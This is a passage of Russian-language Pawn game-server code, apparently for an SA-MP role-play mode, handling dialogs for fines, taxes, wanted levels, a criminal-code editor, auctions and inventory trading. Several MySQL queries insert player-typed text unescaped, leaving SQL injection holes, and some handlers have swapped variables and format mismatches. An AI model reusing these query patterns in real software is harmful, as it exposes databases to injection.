					SendCopsMessage(str1);
					SendClientMessage(player,-1,"Оплатить штраф можно в ближайшем отделении полиции!");
					
			    }
			    else
			    {
			        query = "";
					format(query, sizeof(query), "SELECT * FROM accounts WHERE name = '%s'", LastDriver[strval(inputtext)]);
					mysql_tquery(mysql, query, "SetStraf", "dsd", playerid,LastDriver[strval(inputtext)],GetPVarInt(playerid,"Shtvaf"));

			    }
			}
			else SendClientMessage(playerid,CGREY,"Данным транспортом никто не пользовался");
			DeletePVar(playerid,"Shtvaf");
		}
		case 470:
		{
		    if(!response) return DeletePVar(playerid,"Shtvaf");
		    if(!strlen(inputtext)) return ShowPlayerDialog(playerid,470,DIALOG_STYLE_INPUT,"Игрок","{ffffff}Введите ID игрока:\n\n","Далее","Отмена");
            if(!IsPlayerConnected(strval(inputtext)) || PlayerLogged[strval(inputtext)] == false || playerid == strval(inputtext)) return SendClientMessage(playerid,CGREY,"Такого игрока нет на сервере");
			new Float:x,Float:y,Float:z;
		    GetPlayerPos(strval(inputtext),x,y,z);
		    if(!IsPlayerInRangeOfPoint(playerid, 5.0, x,y,z)) return SendClientMessage(playerid,CGREY,"Вы не рядом с игроком");
		    PlayerInfo[strval(inputtext)][pShtrav] += GetPVarInt(playerid,"Shtvaf");
		    
	        static const fmt_str[] = "%s выписал Вам штраф в размере %d$";
			new string[sizeof(fmt_str)+MAX_PLAYER_NAME+4];
			format(string, sizeof(string), fmt_str, PlayerInfo[playerid][pSendername],GetPVarInt(playerid,"Shtvaf"));
			SendClientMessage(playerid,CYELLOW,string);
			static const fmt_string1[] = "[R] %s | %s выписал штраф %s в размере %d$";
			new str1[sizeof(fmt_string1)+MAX_PLAYER_NAME+MAX_PLAYER_NAME+3+20];
			format(str1, sizeof(str1), fmt_string1,FracInfo[PlayerInfo[playerid][pMember]][fName],PlayerInfo[playerid][pSendername],PlayerInfo[strval(inputtext)][pSendername],GetPVarInt(playerid,"Shtvaf"));
			SendCopsMessage(str1);
			SendClientMessage(strval(inputtext),-1,"Оплатить штраф можно в ближайшем отделении полиции!");
			DeletePVar(playerid,"Shtvaf");
		}
		case 471:
		{
		    if(!response) return true;
		    if(BizInfo[GetPVarInt(playerid,"PBIZ")][bUl][4]) ShowPlayerDialog(playerid,204,DIALOG_STYLE_LIST,"Способ оплаты","1 | Наличные\n2 | Карта","Далее","Отмена");
			else BuySkin(playerid);

		}
		case 472:
		{
		    if(!response) return DeletePVar(playerid,"WhatLic");
		    if(PlayerInfo[playerid][pCash] < 750) return SendClientMessage(playerid,CGREY,"Недостаточно средств");
		    GiveMoney(playerid,-750);
		    SetPVarInt(playerid,"GoLic",1);
			SendClientMessage(playerid,-1,"Пройдите в тир и начните практическое тестирование");
		}
		case 473:
		{
		    if(!response) return DeletePVar(playerid,"Member");
		    if(!strlen(inputtext) || strval(inputtext) < 0 || strval(inputtext) > 10) return ShowPlayerDialog(playerid,473,DIALOG_STYLE_INPUT,"Налог на дом","{FFFFFF}Введите налог на дома:\n\n","Далее","Отмена");
		    OplBiz = strval(inputtext);
			SetMatsInt("OplBiz",strval(inputtext));
			static const fmt_string2[] = "Налог на дом теперь составляет %d%s";
			new str2[sizeof(fmt_string2)+3];
			format(str2, sizeof(str2), fmt_string2,strval(inputtext),"%");
			SendGov(playerid,str2);
		}
		case 474:
		{
		    if(!response) return DeletePVar(playerid,"Member");
		    if(!strlen(inputtext) || strval(inputtext) < 0 || strval(inputtext) > 10) return ShowPlayerDialog(playerid,474,DIALOG_STYLE_INPUT,"Налог на бизнес","{FFFFFF}Введите налог на бизнес:\n\n","Далее","Отмена");
		    OplDom = strval(inputtext);
			SetMatsInt("OplDom",strval(inputtext));
			static const fmt_string2[] = "Налог на дом теперь составляет %d%s";
			new str2[sizeof(fmt_string2)+3];
			format(str2, sizeof(str2), fmt_string2,strval(inputtext),"%");
			SendGov(playerid,str2);
		}
		case 475:
		{
		    if(!response) return DeletePVar(playerid,"Member");
		    if(!strlen(inputtext) || strval(inputtext) < 0 || strval(inputtext) > 10) return ShowPlayerDialog(playerid,475,DIALOG_STYLE_INPUT,"Налог на транспорт","{FFFFFF}Введите налог на транспорт:\n\n","Далее","Отмена");
		    NalogTS = strval(inputtext);
			SetMatsInt("nalogts",strval(inputtext));
			static const fmt_string2[] = "Налог на транспорт теперь составляет %d%s";
			new str2[sizeof(fmt_string2)+3];
			format(str2, sizeof(str2), fmt_string2,strval(inputtext),"%");
			SendGov(playerid,str2);
		}
		case 476:
		{
			if(!response) return 1;
			CaptInfo[listitem][stop] = (!CaptInfo[listitem][stop]) ? (1) : (0);
			static const fmt_string[] = "[A] %s %s воевать %s";
			new str[sizeof(fmt_string)+MAX_PLAYER_NAME+32+30];
			format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pSendername],(CaptInfo[listitem][stop]) ? ("запретил") : ("разрешил"),FracInfo[listitem+6][fName]);
			SendAdminMessage(CGREY,str);
			switch(listitem)
			{
			    case 0:  SetMatsInt("grovestop",CaptInfo[listitem][stop]);
			    case 1:  SetMatsInt("ballasstop",CaptInfo[listitem][stop]);
			    case 2:  SetMatsInt("rifastop",CaptInfo[listitem][stop]);
			    case 3:  SetMatsInt("aztecasstop",CaptInfo[listitem][stop]);
			    case 4:  SetMatsInt("vagosstop",CaptInfo[listitem][stop]);
			    case 5:  SetMatsInt("bikersstop",CaptInfo[listitem][stop]);
			    case 6:  SetMatsInt("lcnstop",CaptInfo[listitem][stop]);
			    case 7:  SetMatsInt("yakuzastop",CaptInfo[listitem][stop]);
			    case 8:  SetMatsInt("rmstop",CaptInfo[listitem][stop]);
			}
		}
		case 477:
		{
		    if(!response) return 1;
			gSatellite[0] = TextDrawCreate(-3.5000, -15.5555, "LD_SPAC:white"); // ?????
			TextDrawTextSize(gSatellite[0], 656.0000, 560.0000);
			TextDrawAlignment(gSatellite[0], 1);
			TextDrawColor(gSatellite[0], 303174399);
			TextDrawBackgroundColor(gSatellite[0], 255);
			TextDrawFont(gSatellite[0], 4);
			TextDrawSetProportional(gSatellite[0], 0);
			TextDrawSetShadow(gSatellite[0], 0);

			gSatellite[1] = TextDrawCreate(316.0000, 170.7110, "LOADING"); // ????????
			TextDrawLetterSize(gSatellite[1], 0.6480, 2.9439);
			TextDrawAlignment(gSatellite[1], 2);
			TextDrawColor(gSatellite[1], -1);
			TextDrawBackgroundColor(gSatellite[1], 255);
			TextDrawFont(gSatellite[1], 2);
			TextDrawSetProportional(gSatellite[1], 1);
			TextDrawSetShadow(gSatellite[1], 0);

			gSatellite[2] = TextDrawCreate(230.6000, 221.1452, "LOG:"); // ?????????? ? ????????
			TextDrawLetterSize(gSatellite[2], 0.3834, 2.0417);
			TextDrawAlignment(gSatellite[2], 2);
			TextDrawColor(gSatellite[2], -1);
			TextDrawBackgroundColor(gSatellite[2], 255);
			TextDrawFont(gSatellite[2], 2);
			TextDrawSetProportional(gSatellite[2], 1);
			TextDrawSetShadow(gSatellite[2], 0);

			gSatellite[3] = TextDrawCreate(315.1000, 303.0075, "please wait for download..."); // ??????????, ????????? ?????? ????????
			TextDrawLetterSize(gSatellite[3], 0.2089, 1.1022);
			TextDrawAlignment(gSatellite[3], 2);
			TextDrawColor(gSatellite[3], -1);
			TextDrawBackgroundColor(gSatellite[3], 255);
			TextDrawFont(gSatellite[3], 2);
			TextDrawSetProportional(gSatellite[3], 1);
			TextDrawSetShadow(gSatellite[3], 0);

			gSatellite[5] = TextDrawCreate(250.0000, 201.0444, "LD_SPAC:white"); // ?????
			TextDrawTextSize(gSatellite[5], 3.0000, 35.0000);
			TextDrawAlignment(gSatellite[5], 1);
			TextDrawColor(gSatellite[5], 303174399);
			TextDrawBackgroundColor(gSatellite[5], 255);
			TextDrawFont(gSatellite[5], 4);
			TextDrawSetProportional(gSatellite[5], 0);
			TextDrawSetShadow(gSatellite[5], 0);

			gSatellite[6] = TextDrawCreate(293.0000, 199.7999, "LD_SPAC:white"); // ?????
			TextDrawTextSize(gSatellite[6], 3.0000, 35.0000);
			TextDrawAlignment(gSatellite[6], 1);
			TextDrawColor(gSatellite[6], 303174399);
			TextDrawBackgroundColor(gSatellite[6], 255);
			TextDrawFont(gSatellite[6], 4);
			TextDrawSetProportional(gSatellite[6], 0);
			TextDrawSetShadow(gSatellite[6], 0);

			gSatellite[7] = TextDrawCreate(333.0000, 202.9110, "LD_SPAC:white"); // ?????
			TextDrawTextSize(gSatellite[7], 3.0000, 35.0000);
			TextDrawAlignment(gSatellite[7], 1);
			TextDrawColor(gSatellite[7], 303174399);
			TextDrawBackgroundColor(gSatellite[7], 255);
			TextDrawFont(gSatellite[7], 4);
			TextDrawSetProportional(gSatellite[7], 0);
			TextDrawSetShadow(gSatellite[7], 0);

			gSatellite[8] = TextDrawCreate(373.5000, 202.9110, "LD_SPAC:white"); // ?????
			TextDrawTextSize(gSatellite[8], 3.0000, 35.0000);
			TextDrawAlignment(gSatellite[8], 1);
			TextDrawColor(gSatellite[8], 303174399);
			TextDrawBackgroundColor(gSatellite[8], 255);
			TextDrawFont(gSatellite[8], 4);
			TextDrawSetProportional(gSatellite[8], 0);
			TextDrawSetShadow(gSatellite[8], 0);

			gSatellite[4] = TextDrawCreate(213.0000, 204.1336, "LD_SPAC:white"); // ?????
			TextDrawTextSize(gSatellite[4], 202.0000, 10.0000);
			TextDrawAlignment(gSatellite[4], 1);
			TextDrawColor(gSatellite[4], 404232447);
			TextDrawBackgroundColor(gSatellite[4], 255);
			TextDrawFont(gSatellite[4], 4);
			TextDrawSetProportional(gSatellite[4], 0);
			TextDrawSetShadow(gSatellite[4], 0);


			pSatellite[playerid][0] = CreatePlayerTextDraw(playerid, 213.5999, 241.1003, "~y~CHECK.. ~w~system startup..."); // ?????? ???????
			PlayerTextDrawLetterSize(playerid, pSatellite[playerid][0], 0.2074, 1.0399);
			PlayerTextDrawAlignment(playerid, pSatellite[playerid][0], 1);
			PlayerTextDrawColor(playerid, pSatellite[playerid][0], -1);
			PlayerTextDrawBackgroundColor(playerid, pSatellite[playerid][0], 255);
			PlayerTextDrawFont(playerid, pSatellite[playerid][0], 2);
			PlayerTextDrawSetProportional(playerid, pSatellite[playerid][0], 1);
			PlayerTextDrawSetShadow(playerid, pSatellite[playerid][0], 0);

			pSatellite[playerid][1] = CreatePlayerTextDraw(playerid, 213.1999, 250.6009, "~y~CHECK..~w~ the connection to the cameras..."); // ??????????? ? ???????
			PlayerTextDrawLetterSize(playerid, pSatellite[playerid][1], 0.2074, 1.0399);
			PlayerTextDrawAlignment(playerid, pSatellite[playerid][1], 1);
			PlayerTextDrawColor(playerid, pSatellite[playerid][1], -1);
			PlayerTextDrawBackgroundColor(playerid, pSatellite[playerid][1], 255);
			PlayerTextDrawFont(playerid, pSatellite[playerid][1], 2);
			PlayerTextDrawSetProportional(playerid, pSatellite[playerid][1], 1);
			PlayerTextDrawSetShadow(playerid, pSatellite[playerid][1], 0);

			pSatellite[playerid][2] = CreatePlayerTextDraw(playerid, 213.0999, 259.9014, "~y~CHECK..~w~ connection check..."); // ???????? ??????????
			PlayerTextDrawLetterSize(playerid, pSatellite[playerid][2], 0.2074, 1.0399);
			PlayerTextDrawAlignment(playerid, pSatellite[playerid][2], 1);
			PlayerTextDrawColor(playerid, pSatellite[playerid][2], -1);
			PlayerTextDrawBackgroundColor(playerid, pSatellite[playerid][2], 255);
			PlayerTextDrawFont(playerid, pSatellite[playerid][2], 2);
			PlayerTextDrawSetProportional(playerid, pSatellite[playerid][2], 1);
			PlayerTextDrawSetShadow(playerid, pSatellite[playerid][2], 0);

			pSatellite[playerid][3] = CreatePlayerTextDraw(playerid, 213.5999, 269.4020, "~y~CHECK..~w~ loading the interface..."); // ???????? ??????????
			PlayerTextDrawLetterSize(playerid, pSatellite[playerid][3], 0.2074, 1.0399);
			PlayerTextDrawAlignment(playerid, pSatellite[playerid][3], 1);
			PlayerTextDrawColor(playerid, pSatellite[playerid][3], -1);
			PlayerTextDrawBackgroundColor(playerid, pSatellite[playerid][3], 255);
			PlayerTextDrawFont(playerid, pSatellite[playerid][3], 2);
			PlayerTextDrawSetProportional(playerid, pSatellite[playerid][3], 1);
			PlayerTextDrawSetShadow(playerid, pSatellite[playerid][3], 0);

			pSatellite[playerid][4] = CreatePlayerTextDraw(playerid, 213.0000, 204.1336, "LD_SPAC:white"); // ???????? ???
			PlayerTextDrawTextSize(playerid, pSatellite[playerid][4], 0.0000, 10.0000);
			PlayerTextDrawAlignment(playerid, pSatellite[playerid][4], 1);
			PlayerTextDrawColor(playerid, pSatellite[playerid][4], 606348543);
			PlayerTextDrawBackgroundColor(playerid, pSatellite[playerid][4], 255);
			PlayerTextDrawFont(playerid, pSatellite[playerid][4], 4);
			PlayerTextDrawSetProportional(playerid, pSatellite[playerid][4], 0);
			PlayerTextDrawSetShadow(playerid, pSatellite[playerid][4], 0);

			for(new gSL; gSL < 9; gSL++) TextDrawShowForPlayer(playerid, gSatellite[gSL]);
			for(new pSL; pSL < 5; pSL++) PlayerTextDrawShow(playerid, pSatellite[playerid][pSL]);
			SetPVarInt(playerid,"CameraC",5);
			TogglePlayerControllable(playerid, 0);
			SetPVarInt(playerid,"CameraOn",listitem+1);
		}
		case 478:
		{
		    if(!response) return 1;
		    if(!Containers[GetPVarInt(playerid,"ContW")]) return SendClientMessage(playerid,CGREY,"Аукцион закончен!");
		    if(!strlen(inputtext)) return ShowPlayerDialog(playerid,478,DIALOG_STYLE_INPUT,"Ставка","{ffffff}Введите ставку:\n\n{F85A5A} - Ставка должна быть на 10% больше максимальной\n - В случае проигрыша Вам вернётся 80% от Вашей ставки","Далее","Отмена");
		    if(strval(inputtext) < 1) return ShowPlayerDialog(playerid,478,DIALOG_STYLE_INPUT,"Ставка","{ffffff}Введите ставку:\n\n{F85A5A} - Ставка должна быть на 10% больше максимальной\n - В случае проигрыша Вам вернётся 80% от Вашей ставки","Далее","Отмена");
			if(GetPVarInt(playerid,"ContW") < 4)
			{
			    if(strval(inputtext) < 50)
			    {
			        ShowPlayerDialog(playerid,478,DIALOG_STYLE_INPUT,"Ставка","{ffffff}Введите ставку:\n\n{F85A5A} - Ставка должна быть на 10% больше максимальной\n - В случае проигрыша Вам вернётся 80% от Вашей ставки","Далее","Отмена");
			        return SendClientMessage(playerid,CGREY,"Минимальная ставка 50$");
				}
				if(PlayerInfo[playerid][pCash] < strval(inputtext))
				{
			        ShowPlayerDialog(playerid,478,DIALOG_STYLE_INPUT,"Ставка","{ffffff}Введите ставку:\n\n{F85A5A} - Ставка должна быть на 10% больше максимальной\n - В случае проигрыша Вам вернётся 80% от Вашей ставки","Далее","Отмена");
			        return SendClientMessage(playerid,CGREY,"Недостаточно средств");
				}
			}
			else if(GetPVarInt(playerid,"ContW") >= 4)
			{
			    if(strval(inputtext) < 10)
			    {
			        ShowPlayerDialog(playerid,478,DIALOG_STYLE_INPUT,"Ставка","{ffffff}Введите ставку:\n\n{F85A5A} - Ставка должна быть на 10% больше максимальной\n - В случае проигрыша Вам вернётся 80% от Вашей ставки","Далее","Отмена");
			        return SendClientMessage(playerid,CGREY,"Минимальная ставка 10 Donate Points");
				}
				if(PlayerInfo[playerid][pDonate] < strval(inputtext))
				{
			        ShowPlayerDialog(playerid,478,DIALOG_STYLE_INPUT,"Ставка","{ffffff}Введите ставку:\n\n{F85A5A} - Ставка должна быть на 10% больше максимальной\n - В случае проигрыша Вам вернётся 80% от Вашей ставки","Далее","Отмена");
			        return SendClientMessage(playerid,CGREY,"Недостаточно средств");
				}
			}
			if(MaxBet[GetPVarInt(playerid,"ContW")] > strval(inputtext)+MaxBet[GetPVarInt(playerid,"ContW")]*10/100) return ShowPlayerDialog(playerid,478,DIALOG_STYLE_INPUT,"Ставка","{ffffff}Введите ставку:\n\n{F85A5A} - Ставка должна быть на 10% больше максимальной\n - В случае проигрыша Вам вернётся 80% от Вашей ставки","Далее","Отмена");
			if(GetPVarInt(playerid,"NonFlood1") > gettime()) return SendClientMessage(playerid,CGREY,"Подождите...");
			query = "";
			format(query,sizeof(query),"SELECT * FROM containers WHERE container = '%d' AND idacc = '%d' LIMIT 1",GetPVarInt(playerid,"ContW"),PlayerInfo[playerid][pID]);
			mysql_tquery(mysql, query, "CheckPlayerContainer", "dd", playerid,strval(inputtext));
		}
		case 479:
		{
		    if(!response) return DeletePVar(playerid,"SuID");
		    new player = GetPVarInt(playerid,"SuID");
		    if(PlayerInfo[player][pWanted] >= WInfo[listitem+1][wWanted]) return SendClientMessage(playerid,CGREY,"Игрок находится уже в более усиленном розыске");
        	if(IsAGos(player)) return SendClientMessage(playerid,CGREY,"Игрок гос. служащий");
        	SetPlayerWantedLevel(player,WInfo[listitem+1][wWanted]);
		    PlayerInfo[player][pWanted] = WInfo[listitem+1][wWanted];
	   	   	static const fmt_string1[] = "[R] %s | %s объявил в розыск %i степени %s. Причина: %s";
			new str1[sizeof(fmt_string1)+MAX_PLAYER_NAME+MAX_PLAYER_NAME+3+20];
			format(str1, sizeof(str1), fmt_string1,FracInfo[PlayerInfo[playerid][pMember]][fName],PlayerInfo[playerid][pSendername],WInfo[listitem+1][wWanted],PlayerInfo[player][pSendername],WInfo[listitem+1][wName]);
			SendCopsMessage(str1);

	 		static const fmt_string2[] = "Внимание! Вы были объявлены в розыск %i степени | Объявление дал: %s | Причина: %s";
			new str2[sizeof(fmt_string2)+MAX_PLAYER_NAME+3+20];
			format(str2, sizeof(str2), fmt_string2,WInfo[listitem+1][wWanted],PlayerInfo[playerid][pSendername],WInfo[listitem+1][wName]);
			SendClientMessage(player,CBLUE,str2);
			strmid(PlayerInfo[player][pSuAd], WInfo[listitem+1][wName], 0, strlen(WInfo[listitem+1][wName]), 20);
		}
		case 480:
		{
		    if(!response) return DeletePVar(playerid,"Member");
		    switch(listitem)
			{
				case 0: ShowPlayerDialog(playerid,473,DIALOG_STYLE_INPUT,"Налог на дом","{FFFFFF}Введите налог на дома:\n\n","Далее","Отмена");
				case 1: ShowPlayerDialog(playerid,474,DIALOG_STYLE_INPUT,"Налог на бизнес","{FFFFFF}Введите налог на бизнес:\n\n","Далее","Отмена");
				case 2: ShowPlayerDialog(playerid,475,DIALOG_STYLE_INPUT,"Налог на транспорт","{FFFFFF}Введите налог на транспорт:\n\n","Далее","Отмена");
			}
		}
		case 481:
		{
		    if(!response) return 1;
		    switch(listitem)
			{
			    case 0: ShowPlayerDialog(playerid,482,DIALOG_STYLE_INPUT,"Добавить статью","{FFFFFF}Введите описание статьи и уровень розыска через запятую:\n\nНапример: Убийство, 6","Далее","Отмена");
				case 1:
				{
				    query = "{ffffff}Код\tУровень розыска\tОписание\n";
				    new str[144];
					for(new i = 1; i <= TOTALWANTED; i++)
					{
					    format(str,sizeof(str),"#%d\t%d\t%s\n",WInfo[i][wID],WInfo[i][wWanted],WInfo[i][wName]);
					    strcat(query,str);
					}
					ShowPlayerDialog(playerid,483,DIALOG_STYLE_TABLIST_HEADERS,"Выбор статьи",query,"Далее","Отмена");
				}
			}
		}
		case 482:
		{
		    if(!response) return ShowPlayerDialog(playerid,481,DIALOG_STYLE_LIST,"Кодекс штата","{20BA09}Добавить статью\n{FFFFFF}Изменить статью","Далее","Отмена");
			new name[32],wanted;
			if(sscanf(inputtext, "p<,>s[32]d",name,wanted) || wanted < 1 || wanted > 6 || strlen(name) > 32) return ShowPlayerDialog(playerid,482,DIALOG_STYLE_INPUT,"Добавить статью","{FFFFFF}Введите описание статьи и уровень розыска через запятую:\n\nНапример: Убийство, 6","Далее","Отмена");
			if(TOTALWANTED+1 > MAX_WANTED) return SendClientMessage(playerid,CGREY,"Превышен лимит статей!");
			TOTALWANTED++;
			WInfo[TOTALWANTED][wID] = TOTALWANTED;
			WInfo[TOTALWANTED][wWanted] = wanted;
			strmid(WInfo[TOTALWANTED][wName],name,strlen(name),32);
			static const fmt_string2[] = "Новая статья в кодексте штата: '%s' (%d уровень розыска)";
			new str2[sizeof(fmt_string2)+30+3];
			format(str2, sizeof(str2), fmt_string2,name,wanted);
			SendGov(playerid,str2);
			query = "";
			format(query, sizeof(query), "INSERT INTO uk (name,wanted) VALUES ('%s','%d')", name,wanted);
			mysql_tquery(mysql,query);
		}
		case 483:
		{
		    if(!response) return ShowPlayerDialog(playerid,481,DIALOG_STYLE_LIST,"Кодекс штата","{20BA09}Добавить статью\n{FFFFFF}Изменить статью","Далее","Отмена");
			SetPVarInt(playerid,"Uk",listitem+1);
			ShowPlayerDialog(playerid,484,DIALOG_STYLE_LIST,"Изменить статью","1 | Изменить описание\n2 | Изменить уровень розыска","Далее","Отмена");
		}
		case 484:
		{
		    if(!response) return DeletePVar(playerid,"Uk");
			switch(listitem)
			{
			    case 0: ShowPlayerDialog(playerid,485,DIALOG_STYLE_INPUT,"Изменить описание","{ffffff}Введите новое описание статьи:\n\n","Далее","Отмена");
			    case 1: ShowPlayerDialog(playerid,486,DIALOG_STYLE_INPUT,"Изменить уровень розыска","{ffffff}Введите новой уровень розыска:\n\n","Далее","Отмена");
			}
		}
		case 485:
		{
		    if(!response) return DeletePVar(playerid,"Uk");
		    if(!strlen(inputtext) || strlen(inputtext) > 32) return ShowPlayerDialog(playerid,485,DIALOG_STYLE_INPUT,"Изменить описание","{ffffff}Введите новое описание статьи:\n\n","Далее","Отмена");
			new i = GetPVarInt(playerid,"Uk");
			strmid(WInfo[i][wName],inputtext,strlen(inputtext),32);
            query = "";
			format(query,sizeof(query),"UPDATE `uk` SET `name` = '%s' WHERE id = '%d' LIMIT 1",inputtext,i);
			mysql_tquery(mysql,query);
			static const fmt_string2[] = "Новае описание статьи #%d: '%s'";
			new str2[sizeof(fmt_string2)+30+3];
			format(str2, sizeof(str2), fmt_string2,i,inputtext);
			SendGov(playerid,str2);
			DeletePVar(playerid,"Uk");
		}
		case 486:
		{
		    if(!response) return DeletePVar(playerid,"Uk");
		    if(!strlen(inputtext) || strval(inputtext) < 1 || strval(inputtext) > 6) return ShowPlayerDialog(playerid,486,DIALOG_STYLE_INPUT,"Изменить уровень розыска","{ffffff}Введите новой уровень розыска:\n\n","Далее","Отмена");
		    //if(!strlen(inputtext) || strlen(inputtext) > 32) return ShowPlayerDialog(playerid,484,DIALOG_STYLE_INPUT,"Изменить описание","{ffffff}Введите новое описание статьи:\n\n","Далее","Отмена");
			new i = GetPVarInt(playerid,"Uk");
			WInfo[i][wWanted]  = strval(inputtext);
            query = "";
			format(query,sizeof(query),"UPDATE `uk` SET `wanted` = '%s' WHERE id = '%d' LIMIT 1",strval(inputtext) ,i);
			mysql_tquery(mysql,query);
			static const fmt_string2[] = "Новай уровень розыска статьи #%d: %d";
			new str2[sizeof(fmt_string2)+30+3];
			format(str2, sizeof(str2), fmt_string2,i,strval(inputtext));
			SendGov(playerid,str2);
			DeletePVar(playerid,"Uk");
		}
		case 487:
		{
		    if(!response) return true;
		    new den[60];
		    if(sscanf(inputtext, "p<,>s[60]",den) || strlen(den) > 60) return ShowPlayerDialog(playerid, 487, DIALOG_STYLE_INPUT, "Warn", "{FFFFFF}Введите причину варна:\n\n", "Далее","Отмена");
		    new str[80];
		    format(str,sizeof(str),"%d %s",GetPVarInt(playerid,"SpecID"),den);
		    cmd_warn(playerid,str);
		}
		case 488:
		{
		    if(!response) return true;
		    new den;
		    if(sscanf(inputtext, "p<,>d",den) || den < 1 || den > 100) return ShowPlayerDialog(playerid, 487, DIALOG_STYLE_INPUT, "HP", "{FFFFFF}Введите количество HP:\n\n", "Далее","Отмена");
		    new str[80];
		    format(str,sizeof(str),"%d %d",GetPVarInt(playerid,"SpecID"),den);
		    cmd_hp(playerid,str);
		}
		case 489:
		{
			if(!response) return DeletePVar(playerid,"CheckPlayer");
			if(listitem < 15)
			{
			    format(query, sizeof(query), "SELECT * FROM prize WHERE id = '%d'", ListNick[playerid][listitem]);
				mysql_tquery(mysql, query, "GivePrize", "dd", playerid,ListNick[playerid][listitem]);
			}
			else
			{
			    format(query, sizeof(query), "SELECT * FROM prize WHERE idacc = '%d' AND id > '%d'", PlayerInfo[playerid][pID],GetPVarInt(playerid,"CheckPlayer"));
				mysql_tquery(mysql, query, "GetPrizes", "d", playerid);
			}
		}
		case 490:
		{
		    if(!response)
		    {
				PlayerTextDrawHide(playerid,InventoryP[GetPVarInt(playerid,"SetInvID")+6][playerid]);
				PlayerTextDrawBackgroundColor(playerid, InventoryP[GetPVarInt(playerid,"SetInvID")+6][playerid], 589505535);
				PlayerTextDrawShow(playerid,InventoryP[GetPVarInt(playerid,"SetInvID")+6][playerid]);
		        return DeletePVar(playerid,"SetInvID");
		    }
		    new i = GetPVarInt(playerid,"SetInvID");
		    new kolvo,cena;
		    if(sscanf(inputtext, "p<,>dd",kolvo,cena) || kolvo < 1 || kolvo> InvInfo[playerid][iKol][i] || cena < 1) return ShowPlayerDialog(playerid,490,DIALOG_STYLE_INPUT,"Информация","{ffffff}Введите количество и цену за одну штуку товара через запятую:\n\nНапример: 3,30","Далее","Отмена");
            PlayerTextDrawHide(playerid,InventoryP[i+6][playerid]);
			PlayerTextDrawBackgroundColor(playerid, InventoryP[i+6][playerid], 589505535);
			PlayerTextDrawShow(playerid,InventoryP[i+6][playerid]);
			if(GetPVarInt(playerid,"OpenTorg") || GetPVarInt(playerid,"OpenBlackTorg"))
			{
			    GiveTorgInv(playerid,InvInfo[playerid][iSlot][i],kolvo,cena);
				InvMinus(playerid,InvInfo[playerid][iSlot][i],kolvo);
				SendClientMessage(playerid,CREWARD,"Вы выставили товар на продажу");
			}
			PlayerTextDrawHide(playerid,InventoryP[i+6][playerid]);
			PlayerTextDrawBackgroundColor(playerid, InventoryP[i+6][playerid], 589505535);
			PlayerTextDrawShow(playerid,InventoryP[i+6][playerid]);
			DeletePVar(playerid,"SetInvID");
		}
		case 491:
		{
		    if(!response) 
			{
				PlayerTextDrawHide(playerid,InventoryP1[GetPVarInt(playerid,"SetInv")][playerid]);
				PlayerTextDrawBackgroundColor(playerid, InventoryP1[GetPVarInt(playerid,"SetInv")][playerid], 589505535);
				PlayerTextDrawShow(playerid,InventoryP1[GetPVarInt(playerid,"SetInv")][playerid]);
				DeletePVar(playerid,"SetInv");
		        return DeletePVar(playerid,"SetInvID");
		    }
			new str[70];
			if(!strlen(inputtext) || strval(inputtext) < 1)
			{
				format(str,sizeof(str),"{ffffff}Введите сколько хотите купить товара:\n\nЦена за шт.: {f7ae11}%d$",TorgInfo[tPrice][GetPVarInt(playerid,"SetInvID")]);
				return ShowPlayerDialog(playerid,491,DIALOG_STYLE_INPUT,"Введите количество","{ffffff}Введите сколько хотите положить:\n\n","Далее","Отмена");
			}
			if(PlayerInfo[playerid][pCash] < strval(inputtext)*TorgInfo[tPrice][GetPVarInt(playerid,"SetInvID")])
			{
			    format(str,sizeof(str),"{ffffff}Введите сколько хотите купить товара:\n\nЦена за шт.: {f7ae11}%d$",TorgInfo[tPrice][GetPVarInt(playerid,"SetInvID")]);
		 		ShowPlayerDialog(playerid,491,DIALOG_STYLE_INPUT,"Введите количество","{ffffff}Введите сколько хотите положить:\n\n","Далее","Отмена");
			    return SendClientMessage(playerid,CGREY,"Недостаточно средств!");
			}
			if(GetFree(playerid,TorgInfo[tSlot][GetPVarInt(playerid,"SetInvID")],strval(inputtext)))
			{
			    format(str,sizeof(str),"{ffffff}Введите сколько хотите купить товара:\n\nЦена за шт.: {f7ae11}%d$",TorgInfo[tPrice][GetPVarInt(playerid,"SetInvID")]);
		 		ShowPlayerDialog(playerid,491,DIALOG_STYLE_INPUT,"Введите количество","{ffffff}Введите сколько хотите положить:\n\n","Далее","Отмена");
			    return SendClientMessage(playerid,CGREY,"Недостаточно места в инвентаре!");
			}
			GiveMoney(playerid,-strval(inputtext)*TorgInfo[tPrice][GetPVarInt(playerid,"SetInvID")]);
			if(TorgInfo[tKol][GetPVarInt(playerid,"SetInvID")]-strval(inputtext) > 0)
			{
		 		TorgInfo[tKol][GetPVarInt(playerid,"SetInvID")] -= strval(inputtext);
		 		UpdateTorgInventory(playerid,GetPVarInt(playerid,"SetInvID"));
			}
			else
			{
				TorgInfo[tSlot][GetPVarInt(playerid,"SetInvID")] = 0;
				TorgInfo[tPrice][GetPVarInt(playerid,"SetInvID")] = 0;
				TorgInfo[tIDacc][GetPVarInt(playerid,"SetInvID")] = 0;
				UpdateTorgInventory(playerid,GetPVarInt(playerid,"SetInvID"),1);
			}
			GiveInv(playerid,TorgInfo[tSlot][GetPVarInt(playerid,"SetInvID")],strval(inputtext));
			PlayerTextDrawHide(playerid,InventoryP1[GetPVarInt(playerid,"SetInv")][playerid]);
			PlayerTextDrawBackgroundColor(playerid, InventoryP1[GetPVarInt(playerid,"SetInv")][playerid], 589505535);
			PlayerTextDrawShow(playerid,InventoryP1[GetPVarInt(playerid,"SetInv")][playerid]);
			DeletePVar(playerid,"SetInv");
	        return DeletePVar(playerid,"SetInvID");
		}
		case 492:
		{
			if(!response) return 1;
            if(!IsAMafia(playerid) && !PlayerInfo[playerid][pLeader] && listitem > 0) listitem++;
			switch(listitem)
			{
			    case 0:
			    {
			        ApplyDynamicActorAnimation(NarkBot,"PED","IDLE_CHAT",4.0,0,0,0,0,0);
					Update3DTextLabelTextEx(NarkText,-1,"Напиши ему, он поможет тебе");
					SetTimerEx("ClearBotGlobal", 3000, false, "dd", NarkBot,_:NarkText);
					static const fmt_str1[] = "{ffffff}Для получение наркотиков надо заказать товар!\nИспользуйте телефон для заказа наркотиков.\nОтправьте любое SMS на номер: {f7ae11}%d";
					new string1[sizeof(fmt_str1)+10];
					format(string1, sizeof(string1), fmt_str1,NumberDrugs);
					ShowPlayerDialog(playerid,0,DIALOG_STYLE_MSGBOX,"Покупка наркотиков",string1,"Далее","");
			    }
			    case 1:
			    {
